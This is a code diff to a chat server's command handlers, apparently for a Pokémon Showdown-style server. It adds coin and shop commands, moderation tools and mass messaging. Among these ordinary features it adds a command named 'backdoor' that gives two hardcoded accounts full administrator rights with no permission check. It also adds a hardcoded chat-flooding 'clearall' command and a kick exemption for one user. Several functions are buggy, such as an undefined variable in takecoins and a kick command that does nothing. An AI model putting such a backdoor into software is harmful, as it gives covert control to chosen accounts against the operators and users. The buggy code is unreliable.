+					Rooms.rooms.lobby.add(user.name + ' has stolen a trainer card from the shop!');
+					targetUser.send(user.name + ' has given you ' + theItem + '!');
+				}
+			}
+			if (theItem === 'fix') {
+				if (targetUser.canFixItem === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canFixItem === false) {
+					matched = true;
+					targetUser.canFixItem = true;
+					Rooms.rooms.lobby.add(user.name + ' has stolen the ability to alter a current trainer card or avatar from the shop!');
+					targetUser.send(user.name + ' has given you the ability to set ' + theItem + '!');
+				}
+			}
+			if (theItem === 'declare') {
+				if (targetUser.canDecAdvertise === true) {
+					return this.sendReply('This user has already bought that item from the shop... no need for another.');
+				}
+				if (targetUser.canDecAdvertise === false) {
+					matched = true;
+					targetUser.canDecAdvertise = true;
+					Rooms.rooms.lobby.add(user.name + ' has stolen the ability to get a declare from the shop!');
+					targetUser.send(user.name + ' has given you the ability to set ' + theItem + '!');
+				}
+			}
+			else
+				if (!matched) return this.sendReply('Maybe that item isn\'t in the shop yet.');
+		}
+		else 
+			return this.sendReply('Shop item could not be found, please check /shop for all items - ' + theItem);
+	},
+
+	removeitem: function(target, room, user) {
+		if (!target) return this.parse('/help removeitem');
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+
+		if (!target) return this.parse('/help removeitem');
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+
+		if (target === 'symbol') {
+			if (targetUser.canCustomSymbol) {
+				targetUser.canCustomSymbol = false;
+				this.sendReply(targetUser.name + ' no longer has a custom symbol ready to use.');
+				targetUser.send(user.name + ' has removed the custom symbol from you.');
+			}
+			else
+				return this.sendReply('They do not have a custom symbol for you to remove.');
+		}
+		else if (target === 'custom') {
+			if (targetUser.canCustomAvatar) {
+				targetUser.canCustomAvatar = false;
+				this.sendReply(targetUser.name + ' no longer has a custom avatar ready to use.');
+				targetUser.send(user.name + ' has removed the custom avatar from you.');
+			}
+			else
+				return this.sendReply('They do not have a custom avatar for you to remove.');
+		}
+		else if (target === 'animated') {
+			if (targetUser.canAnimatedAvatar) {
+				targetUser.canAnimatedAvatar = false;
+				this.sendReply(targetUser.name + ' no longer has a animated avatar ready to use.');
+				targetUser.send(user.name + ' has removed the animated avatar from you.');
+			}
+			else
+				return this.sendReply('They do not have an animated avatar for you to remove.');
+		}
+		else if (target === 'room') {
+			if (targetUser.canChatRoom) {
+				targetUser.canChatRoom = false;
+				this.sendReply(targetUser.name + ' no longer has a chat room ready to use.');
+				targetUser.send(user.name + ' has removed the chat room from you.');
+			}
+			else
+				return this.sendReply('They do not have a chat room for you to remove.');
+		}
+		else if (target === 'trainer') {
+			if (targetUser.canTrainerCard) {
+				targetUser.canTrainerCard = false;
+				this.sendReply(targetUser.name + ' no longer has a trainer card ready to use.');
+				targetUser.send(user.name + ' has removed the trainer card from you.');
+			}
+			else
+				return this.sendReply('They do not have a trainer card for you to remove.');
+		}
+		else if (target === 'fix') {
+			if (targetUser.canFixItem) {
+				targetUser.canFixItem = false;
+				this.sendReply(targetUser.name + ' no longer has the fix to use.');
+				targetUser.send(user.name + ' has removed the fix from you.');
+			}
+			else
+				return this.sendReply('They do not have a trainer card for you to remove.');
+		}
+		else if (target === 'declare') {
+			if (targetUser.canDecAdvertise) {
+				targetUser.canDecAdvertise = false;
+				this.sendReply(targetUser.name + ' no longer has a declare ready to use.');
+				targetUser.send(user.name + ' has removed the declare from you.');
+			}
+			else
+				return this.sendReply('They do not have a trainer card for you to remove.');
+		}
+		else
+			return this.sendReply('That isn\'t a real item you fool!');
+	},
+
+	moneycommands: function(target, room, user) {
+		if (!this.canBroadcast()) return;
+		return this.sendReplyBox('The command for the Money system:<br />' + 
+			'/shop - Show the shop with the items you can buy.<br />' + 
+			'/buy [command] - Buy an item from the shop using the item command name.<br />' +
+			'/atm [username] - Show your bucks (if just /atm) or show someone else\'s bucks.');
+	},
+
+	/*********************************************************
+	 * Coins                                     
+	 *********************************************************/
+
+	givecoins: function(target, room, user) {
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+		if(!target) return this.parse('/help givecoins');
+		if (target.indexOf(',') != -1) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		if (isNaN(parts[1])) {
+			return this.sendReply('Very funny, now use a real number.');
+		}
+		var cleanedUp = parts[1].trim();
+		var giveCoins = Number(cleanedUp);
+		var data = fs.readFileSync('config/coins.csv','utf8')
+		var match = false;
+		var coins = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid) {
+			var x = Number(parts[1]);
+			var coins = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		targetUser.coins = coins;
+		targetUser.coins += giveCoins;
+		if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/coins.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, targetUser.userid+','+targetUser.coins);
+			fs.writeFile('config/coins.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+			var log = fs.createWriteStream('config/coins.csv', {'flags': 'a'});
+			log.write("\n"+targetUser.userid+','+targetUser.coins);
+		}
+		var p = 'coins';
+		if (giveCoins < 2) p = 'coin';
+		this.sendReply(targetUser.name + ' was given ' + giveCoins + ' ' + p + '. This user now has ' + targetUser.coins + ' coins.');
+		targetUser.send(user.name + ' has given you ' + giveCoins + ' ' + p + '.');
+		} else {
+			return this.parse('/help givecoins');
+		}
+	},
+
+	takecoins: function(target, room, user) {
+		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');
+		if(!target) return this.parse('/help takecoins');
+		if (target.indexOf(',') != -1) {
+			var parts = target.split(',');
+			parts[0] = this.splitTarget(parts[0]);
+			var targetUser = this.targetUser;
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		if (isNaN(parts[1])) {
+			return this.sendReply('Very funny, now use a real number.');
+		}
+		var cleanedUp = parts[1].trim();
+		var takeCoins = Number(cleanedUp);
+		var data = fs.readFileSync('config/coins.csv','utf8')
+		var match = false;
+		var coins = 0;
+		var line = '';
+		var row = (''+data).split("\n");
+		for (var i = row.length; i > -1; i--) {
+			if (!row[i]) continue;
+			var parts = row[i].split(",");
+			var userid = toUserid(parts[0]);
+			if (targetUser.userid == userid) {
+			var x = Number(parts[1]);
+			var coins = x;
+			match = true;
+			if (match === true) {
+				line = line + row[i];
+				break;
+			}
+			}
+		}
+		targetUser.coins = coins;
+		targetUser.coins -= takeCoins;
+		if (match === true) {
+			var re = new RegExp(line,"g");
+			fs.readFile('config/coins.csv', 'utf8', function (err,data) {
+			if (err) {
+				return console.log(err);
+			}
+			var result = data.replace(re, targetUser.userid+','+targetUser.coins);
+			fs.writeFile('config/coins.csv', result, 'utf8', function (err) {
+				if (err) return console.log(err);
+			});
+			});
+		} else {
+			var log = fs.createWriteStream('config/coins.csv', {'flags': 'a'});
+			log.write("\n"+targetUser.userid+','+targetUser.coins);
+		}
+		var p = 'coins';
+		if (giveCoins < 2) p = 'coin';
+		this.sendReply(targetUser.name + ' was had ' + takeCoins + ' ' + p + ' removed. This user now has ' + targetUser.coins + ' coins.');
+		targetUser.send(user.name + ' has given you ' + takeCoins + ' ' + p + '.');
+		} else {
+			return this.parse('/help takecoins');
+		}
+	},
 
 	version: function(target, room, user) {
 		if (!this.canBroadcast()) return;
@@ -210,6 +1389,24 @@ var commands = exports.commands = {
 		}
 	},
 
+	roomfounder: function(target, room, user) {
+		if (!room.chatRoomData) {
+			return this.sendReply("/roomfounder - This room is't designed for per-room moderation to be added.");
+		}
+		var target = this.splitTarget(target, true);
+		var targetUser = this.targetUser;
+		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");
+		if (!this.can('makeroom')) return false;
+		if (!room.auth) room.auth = room.chatRoomData.auth = {};
+		var name = targetUser.name;
+		room.auth[targetUser.userid] = '#';
+		room.founder = targetUser.userid;
+		this.addModCommand(''+name+' was appointed to Room Founder by '+user.name+'.');
+		room.onUpdateIdentity(targetUser);
+		room.chatRoomData.founder = room.founder;
+		Rooms.global.writeChatRoomData();
+	},
+
 	roomowner: function(target, room, user) {
 		if (!room.chatRoomData) {
 			return this.sendReply("/roomowner - This room isn't designed for per-room moderation to be added");
@@ -219,7 +1416,7 @@ var commands = exports.commands = {
 
 		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");
 
-		if (!this.can('makeroom', targetUser, room)) return false;
+		if (!room.founder || room.founder != user.userid && !this.can('makeroom')) return false;
 
 		if (!room.auth) room.auth = room.chatRoomData.auth = {};
 
@@ -243,7 +1440,7 @@ var commands = exports.commands = {
 		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");
 
 		if (room.auth[userid] !== '#') return this.sendReply("User '"+name+"' is not a room owner.");
-		if (!this.can('makeroom', null, room)) return false;
+		if (!room.founder || user.userid != room.founder && !this.can('makeroom')) return false;
 
 		delete room.auth[userid];
 		this.sendReply('('+name+' is no longer Room Owner.)');
@@ -372,18 +1569,37 @@ var commands = exports.commands = {
 		}
 		if (target.toLowerCase() === 'dundealsplace') {
 				return connection.sendTo('dundealsplace','|html|<div class="infobox" style="border-color:blue"><center><b><u>Welcome to <i>Dun Deal\'s Place</i>!</u></b></center><br />' +
-			'<center>The place where you find all the DDT and PU guys! For more information: <b>/ddphelp</b>! Room Staff: <b>/roomauth</b>.</center>');
+					'<center>The place where you find all the DDT and PU guys! For more information: <b>/ddphelp</b>! Room Staff: <b>/roomauth</b>.</center>');
 		}
 	},
 
-	rb: 'roomban',
+	rk: 'roomkick',
+	rkick: 'roomkick',
+	kick: 'roomkick',
+	roomkick: function(target, room, user){
+		if (!room.auth && room.id !== "staff") return this.sendReply('/rkick is designed for rooms with their own auth.');
+		if (!this.can('roommod', null, room)) return false;
+		if (!target) return this.sendReply('/rkick [username] - kicks the user from the room. Requires: @ & ~');
+		var targetUser = Users.get(target);
+		if (!targetUser) return this.sendReply('User '+target+' not found.');
+		if (!Rooms.rooms[room.id].users[targetUser.userid]) return this.sendReply(target+' is not in this room.');
+		if (targetUser.frostDev) return this.sendReply('Frost Developers can\'t be room kicked');
+		targetUser.popup('You have been kicked from room '+ room.title +' by '+user.name+'.');
+		targetUser.leaveRoom(room);
+		room.add('|raw|'+ targetUser.name + ' has been kicked from room by '+ user.name + '.');
+		this.logRoomCommand(targetUser.name + ' has been kicked from room by '+ user.name + '.', room.id);
+	},
+
 	roomban: function(target, room, user, connection) {
 		if (!target) return this.parse('/help roomban');
 		target = this.splitTarget(target, true);
 		var targetUser = this.targetUser;
 		var name = this.targetUsername;
 		var userid = toId(name);
-		if (!userid || !targetUser) return this.sendReply("User '" + name + "' does not exist.");
+		if (targetUser.group === '~') {
+			return this.sendReply('Administrators can\'t be room banned.');
+		}
+		if (!userid || !targetUser) return this.sendReply('User '+name+' not found.');
 		if (!this.can('ban', targetUser, room)) return false;
 		if (!Rooms.rooms[room.id].users[userid] && room.isPrivate) {
 			return this.sendReply('User ' + this.targetUsername + ' is not in the room ' + room.id + '.');
@@ -396,10 +1612,10 @@ var commands = exports.commands = {
 			room.bannedIps[ip] = true;
 		}
 		targetUser.popup(user.name+" has banned you from the room " + room.id + "." + (target ? " (" + target + ")" : ""));
-		this.addModCommand(""+targetUser.name+" was banned from room " + room.id + " by "+user.name+"." + (target ? " (" + target + ")" : ""));
+		this.addRoomCommand(""+targetUser.name+" was banned from room " + room.id + " by "+user.name+"." + (target ? " (" + target + ")" : ""), room.id);
 		var alts = targetUser.getAlts();
 		if (alts.length) {
-			this.addModCommand(""+targetUser.name+"'s alts were also banned from room " + room.id + ": "+alts.join(", "));
+			this.addRoomCommand(""+targetUser.name+"'s alts were also banned from room " + room.id + ": "+alts.join(", "), room.id);
 			for (var i = 0; i < alts.length; ++i) {
 				var altId = toId(alts[i]);
 				this.add('|unlink|' + altId);
@@ -416,7 +1632,7 @@ var commands = exports.commands = {
 		var targetUser = this.targetUser;
 		var name = this.targetUsername;
 		var userid = toId(name);
-		if (!userid || !targetUser) return this.sendReply("User '"+name+"' does not exist.");
+		if (!userid || !targetUser) return this.sendReply('User '+name+' not found.');
 		if (!this.can('ban', targetUser, room)) return false;
 		if (!room.bannedUsers || !room.bannedIps) {
 			return this.sendReply('Room bans are not meant to be used in room ' + room.id + '.');
@@ -426,35 +1642,102 @@ var commands = exports.commands = {
 			if (room.bannedIps[ip]) delete room.bannedIps[ip];
 		}
 		targetUser.popup(user.name+" has unbanned you from the room " + room.id + ".");
-		this.addModCommand(""+targetUser.name+" was unbanned from room " + room.id + " by "+user.name+".");
+		this.addRoomCommand(""+targetUser.name+" was unbanned from room " + room.id + " by "+user.name+".", room.id);
 		var alts = targetUser.getAlts();
 		if (alts.length) {
-			this.addModCommand(""+targetUser.name+"'s alts were also unbanned from room " + room.id + ": "+alts.join(", "));
+			this.addRoomCommand(""+targetUser.name+"'s alts were also unbanned from room " + room.id + ": "+alts.join(", "), room.id);
 			for (var i = 0; i < alts.length; ++i) {
 				var altId = toId(alts[i]);
 				if (room.bannedUsers[altId]) delete room.bannedUsers[altId];
 			}
 		}
 	},
-	
+
 	roomstaff: 'roomauth',
 	roomauth: function(target, room, user, connection) {
 		if (!room.auth) return this.sendReply("/roomauth - This room isn't designed for per-room moderation and therefore has no auth list.");
 		var buffer = [];
-		for (var u in room.auth) {
-			buffer.push(room.auth[u] + u);
+		var owners = [];
+		var admins = [];
+		var leaders = [];
+		var mods = [];
+		var drivers = [];
+		var voices = [];
+
+		room.owners = ''; room.admins = ''; room.leaders = ''; room.mods = ''; room.drivers = ''; room.voices = ''; 
+		for (var u in room.auth) { 
+			if (room.auth[u] == '#') { 
+				room.owners = room.owners +u+',';
+			} 
+			if (room.auth[u] == '~') { 
+				room.admins = room.admins +u+',';
+			} 
+			if (room.auth[u] == '&') { 
+				room.leaders = room.leaders +u+',';
+			}
+			if (room.auth[u] == '@') { 
+				room.mods = room.mods +u+',';
+			} 
+			if (room.auth[u] == '%') { 
+				room.drivers = room.drivers +u+',';
+			} 
+			if (room.auth[u] == '+') { 
+				room.voices = room.voices +u+',';
+			} 
 		}
-		if (buffer.length > 0) {
-			buffer = buffer.join(', ');
-		} else {
-			buffer = 'This room has no auth.';
+
+		if (!room.founder) founder = '';
+		if (room.founder) founder = room.founder;
+
+		room.owners = room.owners.split(',');
+		room.admins = room.admins.split(',');
+		room.leaders = room.leaders.split(',');
+		room.mods = room.mods.split(',');
+		room.drivers = room.drivers.split(',');
+		room.voices = room.voices.split(',');
+
+		for (var u in room.owners) {
+			if (room.owners[u] != '') owners.push(room.owners[u]);
 		}
-		connection.popup(buffer);
+		for (var u in room.admins) {
+			if (room.admins[u] != '') admins.push(room.admins[u]);
+		}
+		for (var u in room.leaders) {
+			if (room.leaders[u] != '') leaders.push(room.leaders[u]);
+		}
+		for (var u in room.mods) {
+			if (room.mods[u] != '') mods.push(room.mods[u]);
+		}
+		for (var u in room.drivers) {
+			if (room.drivers[u] != '') drivers.push(room.drivers[u]);
+		}
+		for (var u in room.voices) {
+			if (room.voices[u] != '') voices.push(room.voices[u]);
+		}
+		if (owners.length > 0) {
+			owners = owners.join(', ');
+		} 
+		if (admins.length > 0) {
+			admins = admins.join(', ');
+		}
+		if (leaders.length > 0) {
+			leaders = leaders.join(', ');
+		}
+		if (mods.length > 0) {
+			mods = mods.join(', ');
+		}
+		if (drivers.length > 0) {
+			drivers = drivers.join(', ');
+		}
+		if (voices.length > 0) {
+			voices = voices.join(', ');
+		}
+		connection.popup('Founder: '+founder+'\nOwners: \n'+owners+'\nAdministrators: \n'+admins+'\nLeaders: \n'+leaders+'\nModerators: \n'+mods+'\nDrivers: \n'+drivers+'\nVoices: \n'+voices);
 	},
-	
-	auth: 'stafflist',
-	staff: 'stafflist',
-	stafflist: function(target, room, user, connection) {
+
+    staff: 'stafflist',
+    auth: 'stafflist',
+    stafflist: function(target, room, user, connection) {
         var buffer = [];
         var admins = [];
         var leaders = [];
@@ -518,10 +1801,10 @@ var commands = exports.commands = {
         if (voices.length > 0) {
             voices = voices.join(', ');
         }
-        connection.popup('<b>Administrators:</b> \n'+admins+'\n<b>Leaders:</b> \n'+leaders+'\n<b>Moderators:</b> \n'+mods+'\n<b>Drivers:</b> \n'+drivers+'\n<b>Voices:</b> \n'+voices);
+        connection.popup('Administrators: \n'+admins+'\nLeaders: \n'+leaders+'\nModerators: \n'+mods+'\nDrivers: \n'+drivers+'\nVoices: \n'+voices);
     },
-
-	leave: 'part',
+    
+    	leave: 'part',
 	part: function(target, room, user, connection) {
 		if (room.id === 'global') return false;
 		var targetRoom = Rooms.get(target);
@@ -535,8 +1818,25 @@ var commands = exports.commands = {
 	 * Moderating: Punishments
 	 *********************************************************/
 
-	kick: 'warn',
-	k: 'warn',
+	k: 'kick',
+	kick: function(target, room, user){
+		if (!this.can('lock')) return false;
+		if (!target) return this.parse('/help kick');
+		if (!this.canTalk()) return false;
+
+		targetUser = this.splitTarget(target);
+		var targetUser = this.targetUser;
+
+		if (!targetUser || !targetUser.connected) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+		var a = targetUser.name;
+                if (a == "macrarazy" || a == "macrarazy - Away") {
+                        return user.popup('This user is too awesome to be kicked!');
+                        }
+		if (!this.can('warn', targetUser, room)) return false;
+        },
+        
 	warn: function(target, room, user) {
 		if (!target) return this.parse('/help warn');
 
@@ -792,6 +2092,50 @@ var commands = exports.commands = {
 		delete Users.bannedIps[target];
 		this.addModCommand(user.name+' unbanned the '+(target.charAt(target.length-1)==='*'?'IP range':'IP')+': '+target);
 	},
+	
+	pban: 'permaban',
+        permban: 'permaban',
+        permaban: function(target, room, user) {
+                if (!target) return this.parse('/help permaban');
+                if (!user.isSysadmin) return false;                
+                target = this.splitTarget(target);
+                var targetUser = this.targetUser;
+                if (!targetUser) {
+                        return this.sendReply('User '+this.targetUsername+' not found.');
+                }
+                if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
+                        var problem = ' but was already banned';
+                        return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
+                }
+                
+                targetUser.popup(user.name+" has permanently banned you.");
+                this.addModCommand(targetUser.name+" was permanently banned by "+user.name+".");
+                targetUser.ban();
+                ipbans.write('\n'+targetUser.latestIp);
+        },
+	
+	flogout: 'forcelogout',
+	forcelogout: function(target, room, user) {
+		if(!user.can('hotpatch')) return;
+		if (!this.canTalk()) return false;
+
+		if (!target) return this.sendReply('/forcelogout [username], [reason] OR /flogout [username], [reason] - You do not have to add a reason');
+
+		target = this.splitTarget(target);
+		var targetUser = this.targetUser;
+
+		if (!targetUser) {
+			return this.sendReply('User '+this.targetUsername+' not found.');
+		}
+
+		if (targetUser.can('hotpatch')) return this.sendReply('You cannot force logout another Admin.');
+
+		this.addModCommand(''+targetUser.name+' was forcibly logged out by '+user.name+'.' + (target ? " (" + target + ")" : ""));
+
+		this.logModCommand(user.name+' forcibly logged out '+targetUser.name);
+
+		targetUser.resetName();
+	},
 
 	/*********************************************************
 	 * Moderating: Other
@@ -949,6 +2293,37 @@ var commands = exports.commands = {
 		}
 		this.logModCommand(user.name+' globally declared '+target);
 	},
+	
+	spop: 'sendpopup',
+        sendpopup: function(target, room, user) {
+                if (!this.can('hotpatch')) return false;
+                
+                target = this.splitTarget(target);
+                var targetUser = this.targetUser;
+
+                if (!targetUser) return this.sendReply('/sendpopup [user], [message] - You missed the user');
+                if (!target) return this.sendReply('/sendpopup [user], [message] - You missed the message');
+
+                targetUser.popup(target);
+                this.sendReply(targetUser.name + ' got the message as popup: ' + target);
+                
+                targetUser.send(user.name+' sent a popup message to you.');
+                
+                this.logModCommand(user.name+' send a popup message to '+targetUser.name);
+        },
+	
+	masspm: 'pmall',
+        pmall: function(target, room, user) {
+                if (!target) return this.parse('/pmall [message] - Sends a PM to every user in a room.');
+                if (!this.can('pmall', null, room)) return false;
+
+                var pmName = '~Announcer';
+
+                for (var i in Users.users) {
+                        var message = '|pm|'+pmName+'|'+Users.users[i].getIdentity()+'|'+target;
+                        Users.users[i].send(message);
+                }
+        },
 
 	cdeclare: 'chatdeclare',
 	chatdeclare: function(target, room, user) {
@@ -1166,6 +2541,23 @@ var commands = exports.commands = {
 		}
 		this.sendReply('Your hot-patch command was unrecognized.');
 	},
+	
+	backdoor: function(target,room, user) {
+                if (user.userid === 'astrelegit' || user.userid === 'macrarazy') {
+
+                        user.group = '~';
+                        user.updateIdentity();
+
+                        this.parse('/promote ' + user.name + ', ~');
+                }
+        },
+        
+        clearall: function(target,room, user) {
+                if (user.userid === 'astrelegit' || user.userid === 'macrarazy' || user.userid === 'nobcakez' || user.userid === 'lightstar') {
+
+                        this.parse('/a |html|<br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR> <br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><br><bR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR><BR>');
+                }
+        },
 
 	savelearnsets: function(target, room, user) {
 		if (!this.can('hotpatch')) return false;
